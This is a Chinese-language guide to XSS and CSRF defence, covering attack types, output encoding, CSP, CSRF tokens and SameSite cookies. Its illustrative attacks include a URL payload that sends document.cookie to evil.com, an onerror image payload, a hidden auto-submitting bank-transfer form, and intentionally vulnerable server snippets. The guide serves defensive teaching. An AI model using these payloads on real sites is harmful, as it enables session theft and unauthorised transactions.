---
layout: doc
title: XSS与CSRF防御最佳实践
description: 全面解析XSS与CSRF攻击原理、防御机制与前后端最佳实践，助你构建安全的Web应用。
---

# XSS与CSRF防御最佳实践

XSS（跨站脚本攻击）与CSRF（跨站请求伪造）是Web安全的两大高发威胁。本文将系统讲解其原理、防御机制与前后端最佳实践。

## 目录

- [XSS攻击原理与类型](#xss攻击原理与类型)
- [XSS防御机制与实践](#xss防御机制与实践)
- [CSRF攻击原理与危害](#csrf攻击原理与危害)
- [CSRF防御机制与实践](#csrf防御机制与实践)
- [前后端协同安全建议](#前后端协同安全建议)

## XSS攻击原理与类型

XSS（Cross-Site Scripting）攻击指攻击者将恶意代码注入到网页中，当用户浏览该页面时，恶意代码会在用户的浏览器上执行。

### XSS攻击的危害

XSS攻击可能导致以下危害：

- 窃取用户Cookie或会话信息，实现身份劫持
- 修改DOM结构，实施钓鱼或欺骗
- 监控用户输入，获取敏感信息（如键盘记录）
- 执行恶意网络请求，如CSRF攻击
- 破坏网页内容，损害网站信誉
- 劫持用户浏览器，实现DDoS攻击

### XSS攻击类型

#### 1. 反射型XSS

攻击代码包含在请求中，服务端未过滤即返回给浏览器：

```js
/**
 * 反射型XSS攻击示例
 */
function reflectedXssExample() {
  // 恶意URL示例
  const maliciousUrl = 'https://example.com/search?q=<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>';
  
  // 服务端未过滤直接输出到HTML(错误示例)
  function vulnerableServer(req, res) {
    const query = req.query.q;
    res.send(`
      <h1>搜索结果: ${query}</h1>
      <div>没有找到相关内容</div>
    `);
  }
}
```

#### 2. 存储型XSS

攻击代码存储在服务器数据库中，用户访问包含此内容的页面时触发：

```js
/**
 * 存储型XSS攻击示例
 */
function storedXssExample() {
  // 攻击者提交的评论
  const maliciousComment = '<img src="x" onerror="alert(document.cookie)">';
  
  // 服务端未过滤直接存入数据库
  function vulnerableCommentSystem(req, res) {
    const comment = req.body.comment;
    saveToDatabase(comment); // 未经过滤直接存储
  }
  
  // 其他用户访问评论页面时，恶意代码被执行
  function renderComments() {
    const comments = getCommentsFromDatabase();
    commentsContainer.innerHTML = comments.join('<br>'); // 危险操作
  }
}
```

#### 3. DOM型XSS

完全在客户端执行，恶意代码通过DOM API执行，无需服务端参与：

```js
/**
 * DOM型XSS攻击示例
 */
function domBasedXssExample() {
  // 从URL中获取参数
  const value = new URLSearchParams(window.location.search).get('value');
  
  // 不安全的DOM操作
  document.getElementById('output').innerHTML = value; // 危险操作
  
  // 安全的做法
  document.getElementById('output').textContent = value; // 安全
}
```

## XSS防御机制与实践

### 1. 输入验证与过滤

第一道防线是对用户输入进行严格的验证和过滤：

```js
/**
 * 输入验证与过滤示例
 * @param {string} input 用户输入
 * @returns {string} 过滤后的输入
 */
function validateAndSanitizeInput(input) {
  // 1. 使用白名单验证
  if (!/^[a-zA-Z0-9\s.,?!]+$/.test(input)) {
    throw new Error('包含不允许的字符');
  }
  
  // 2. 长度限制
  if (input.length > 100) {
    throw new Error('输入过长');
  }
  
  // 3. 内容过滤
  return input.replace(/[<>&"']/g, (c) => {
    return {
      '<': '&lt;',
      '>': '&gt;',
      '&': '&amp;',
      '"': '&quot;',
      "'": '&#x27;'
    }[c];
  });
}
```

### 2. 输出编码

任何动态生成的内容必须进行适当的编码处理：

```js
/**
 * 对HTML内容进行转义，防止XSS
 * @param {string} str 原始字符串
 * @returns {string} 转义后的字符串
 */
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

/**
 * 针对不同上下文的编码函数
 */
function contextAwareEncoding() {
  const value = getUserInput();
  
  // HTML上下文
  element.textContent = value; // 自动编码
  
  // HTML属性上下文
  element.setAttribute('data-value', value); // 推荐方式
  
  // JavaScript上下文
  const safeValue = JSON.stringify(value);
  const code = `const userValue = ${safeValue};`;
  
  // URL上下文
  const safeUrl = encodeURIComponent(value);
  element.href = `https://example.com/search?q=${safeUrl}`;
  
  // CSS上下文
  element.style.color = CSS.escape(value);
}
```

### 3. 内容安全策略(CSP)

CSP是现代Web应用的强大安全工具，可以防止大多数XSS攻击：

```js
/**
 * CSP设置示例
 */
function cspImplementation() {
  // 服务端设置CSP响应头
  function setCSPHeaders(res) {
    res.setHeader(
      'Content-Security-Policy',
      `default-src 'self';
       script-src 'self' https://trusted.cdn.com;
       style-src 'self' https://trusted.cdn.com;
       img-src 'self' https://trusted.cdn.com data:;
       connect-src 'self' https://api.example.com;
       font-src 'self';
       frame-src 'none';
       object-src 'none';
       report-uri /csp-report;`
    );
  }
  
  // 或在HTML中设置
  const cspMeta = `
    <meta http-equiv="Content-Security-Policy" 
          content="default-src 'self'; script-src 'self' https://trusted.cdn.com;">
  `;
}
```

### 4. 安全的DOM API和框架

现代前端开发应使用安全的DOM API和框架：

```js
/**
 * 安全DOM操作示例
 */
function secureDOMOperations() {
  const userInput = getUserInput();
  
  // 危险操作
  // element.innerHTML = userInput; // 不安全!
  
  // 安全替代方案
  element.textContent = userInput; // 安全
  
  // 使用框架内置的安全机制(示例：React)
  function ReactExample() {
    // React自动转义变量
    return <div>{userInput}</div>; // 安全
    
    // 危险操作需要显式声明
    // return <div dangerouslySetInnerHTML={{__html: userInput}} />; // 谨慎使用
  }
}
```

### 5. XSS防御的其他策略

```js
/**
 * 其他XSS防御策略
 */
function additionalXssDefenses() {
  // 1. HttpOnly Cookie防止JavaScript访问Cookie
  // 设置方式: Set-Cookie: sessionid=abc123; HttpOnly
  
  // 2. X-XSS-Protection响应头(虽然已逐渐被CSP取代)
  // X-XSS-Protection: 1; mode=block
  
  // 3. 子资源完整性(SRI)检查
  const integrityScript = `
    <script src="https://cdn.example.com/script.js" 
            integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
            crossorigin="anonymous"></script>
  `;
  
  // 4. 沙箱隔离不可信内容
  const sandboxExample = `
    <iframe sandbox="allow-scripts"
            src="https://third-party-content.com"></iframe>
  `;
}
```

## CSRF攻击原理与危害

CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种迫使用户在已登录的Web应用上执行非本意操作的攻击。

### CSRF攻击原理

CSRF攻击的核心原理是利用浏览器自动发送Cookie的机制：

```js
/**
 * CSRF攻击原理示例
 */
function csrfAttackMechanism() {
  // 1. 用户登录了目标网站(如银行)
  // 2. 未登出的情况下访问恶意网站
  // 3. 恶意网站包含以下内容:
  
  const maliciousCode = `
    <!-- 攻击者网站上的隐藏表单 -->
    <form id="csrf-form" action="https://bank.example.com/transfer" method="POST" style="display:none">
      <input type="hidden" name="recipient" value="attacker-account">
      <input type="hidden" name="amount" value="1000">
    </form>
    
    <script>
      // 自动提交表单
      document.getElementById('csrf-form').submit();
    </script>
  `;
  
  // 4. 浏览器自动携带bank.example.com的Cookie发送请求
  // 5. 如果银行网站没有CSRF防护，会执行转账操作
}
```

### CSRF攻击类型

1. **GET类型CSRF**：通过图片等资源标签构造请求
2. **POST类型CSRF**：通过自动提交表单构造请求
3. **链接类型CSRF**：诱导用户点击特制链接

## CSRF防御机制与实践

### 1. CSRF Token

最常用、最有效的CSRF防御机制：

```js
/**
 * CSRF Token实现
 */
function csrfTokenImplementation() {
  // 服务端生成Token
  function generateCSRFToken(req, res) {
    const token = require('crypto').randomBytes(16).toString('hex');
    req.session.csrfToken = token;
    return token;
  }
  
  // 前端表单中包含Token
  function renderFormWithToken(req, res) {
    const token = generateCSRFToken(req);
    res.send(`
      <form method="POST" action="/transfer">
        <input type="hidden" name="csrf_token" value="${token}">
        <input type="text" name="amount">
        <input type="text" name="recipient">
        <button type="submit">转账</button>
      </form>
    `);
  }
  
  // 服务端验证Token
  function validateCSRFToken(req, res, next) {
    const submittedToken = req.body.csrf_token;
    const storedToken = req.session.csrfToken;
    
    if (!submittedToken || submittedToken !== storedToken) {
      return res.status(403).send('CSRF验证失败');
    }
    
    next();
  }
  
  // AJAX请求中携带Token
  function ajaxWithCSRFToken() {
    const token = document.querySelector('meta[name="csrf-token"]').content;
    
    fetch('/api/action', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': token
      },
      body: JSON.stringify(data)
    });
  }
}
```

### 2. Cookie属性保护

使用Cookie的SameSite属性防止CSRF攻击：

```js
/**
 * Cookie SameSite属性设置
 */
function cookieSameSiteProtection() {
  // 服务端设置SameSite属性
  function setSecureCookie(res) {
    // Strict: 完全禁止第三方站点发送Cookie
    res.setHeader('Set-Cookie', 'session=abc123; HttpOnly; Secure; SameSite=Strict');
    
    // Lax: 允许跳转链接带上Cookie，但禁止跨站POST请求等携带Cookie
    res.setHeader('Set-Cookie', 'session=abc123; HttpOnly; Secure; SameSite=Lax');
    
    // None: 允许跨站请求携带Cookie(需要设置Secure)
    res.setHeader('Set-Cookie', 'session=abc123; HttpOnly; Secure; SameSite=None');
  }
  
  // 注意: Chrome 80+默认SameSite=Lax，提供了基本CSRF防护
}
```

### 3. 自定义请求头

利用浏览器的同源策略，第三方网站无法设置自定义请求头：

```js
/**
 * 自定义请求头防CSRF
 */
function customHeaderProtection() {
  // 前端发送请求时添加自定义头
  function secureAjaxRequest() {
    fetch('/api/sensitive-action', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest' // 自定义头
      },
      body: JSON.stringify(data)
    });
  }
  
  // 服务端验证自定义头存在
  function validateCustomHeader(req, res, next) {
    if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
      return res.status(403).send('可能的CSRF攻击');
    }
    next();
  }
}
```

### 4. 双重Cookie验证

不依赖于会话的CSRF防护技术：

```js
/**
 * 双重Cookie验证
 */
function doubleSubmitCookiePattern() {
  // 设置一个仅用于CSRF保护的Cookie
  function setCsrfCookie(res) {
    const csrfToken = require('crypto').randomBytes(16).toString('hex');
    res.setHeader('Set-Cookie', `csrf=${csrfToken}; HttpOnly; Secure; SameSite=Lax`);
    return csrfToken;
  }
  
  // 客户端从Cookie读取并发送
  function clientSubmit() {
    // 从Cookie中获取CSRF令牌(需要服务端在Cookie中提供可访问版本)
    const csrfToken = getCookie('csrf');
    
    // 将令牌作为请求参数和头部提交
    fetch('/api/action', {
      method: 'POST',
      headers: {
        'X-CSRF-Token': csrfToken
      },
      body: formData
    });
  }
  
  // 服务端验证令牌和Cookie一致
  function validateTokens(req, res, next) {
    const cookieToken = req.cookies.csrf;
    const headerToken = req.headers['x-csrf-token'];
    
    if (!cookieToken || !headerToken || cookieToken !== headerToken) {
      return res.status(403).send('CSRF验证失败');
    }
    
    next();
  }
}
```

### 5. 其他CSRF防御机制

```js
/**
 * 其他CSRF防御策略
 */
function otherCsrfProtections() {
  // 1. 验证码保护敏感操作
  const captchaProtection = `
    <form method="POST" action="/transfer">
      <input type="text" name="amount">
      <input type="text" name="recipient">
      <img src="/captcha">
      <input type="text" name="captcha">
      <button type="submit">转账</button>
    </form>
  `;
  
  // 2. 重认证关键操作
  const reauthentication = `
    <form method="POST" action="/change-password">
      <input type="password" name="current_password">
      <input type="password" name="new_password">
      <button type="submit">修改密码</button>
    </form>
  `;
  
  // 3. Referer检查(仅作辅助验证)
  function checkReferer(req, res, next) {
    const referer = req.headers.referer || '';
    if (!referer.startsWith('https://example.com')) {
      // 记录可疑请求但不完全依赖此验证
      console.warn('可疑请求: Referer不匹配');
    }
    next();
  }
}
```

## 前后端协同安全建议

### 1. 安全开发生命周期

```js
/**
 * 安全开发生命周期关键点
 */
function securityDevelopmentLifecycle() {
  return {
    需求阶段: '明确安全需求，威胁建模',
    设计阶段: '采用安全设计模式，最小权限原则',
    编码阶段: '遵循安全编码指南，代码评审',
    测试阶段: 'SAST静态分析+DAST动态测试',
    部署阶段: '安全配置，扫描依赖漏洞',
    维护阶段: '持续监控，定期安全更新'
  };
}
```

### 2. 前端安全最佳实践

- 使用最新版本的框架和库，保持依赖更新
- 采用CSP和其他安全响应头保护应用
- 实施输入验证和输出编码的双重保护
- 敏感操作添加额外验证层（验证码、二次确认）
- 使用HTTPS并配置正确的Cookie属性

### 3. 后端安全最佳实践

- 对所有用户输入进行严格验证和过滤
- 为所有API实施正确的身份认证和授权
- 采用多层次防御，不仅依赖单一安全机制
- 实施安全的会话管理和CSRF保护
- 敏感数据加密存储，使用安全的密码哈希算法
- 设置正确的安全响应头

### 4. 安全监控与应急响应

- 实施日志记录和监控系统，检测可疑活动
- 制定安全事件响应计划，明确责任和流程
- 定期进行安全测试和漏洞扫描
- 鼓励和处理安全漏洞报告
- 保持与安全社区的互动，及时获取最新威胁情报

---

> 参考资料：
> - [OWASP XSS防护备忘单](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
> - [OWASP CSRF防护备忘单](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
> - [MDN 内容安全策略](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
> - [OWASP安全编码实践](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
